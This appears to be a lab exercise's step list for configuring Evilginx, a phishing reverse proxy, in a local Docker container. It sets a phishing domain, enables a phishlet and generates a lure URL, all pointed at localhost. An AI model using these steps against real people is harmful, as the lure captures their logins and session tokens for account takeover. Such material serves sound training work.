
Attack
1. docker exec -it phisherman-evilginx-1 /bin/bash
2. config domain sec565.phish
3. config ipv4 external 127.0.0.1
4. phishlets hostname sec565 sec565.phish
5. phishlets enable sec565
6. lures create sec565
7. lures get-url 0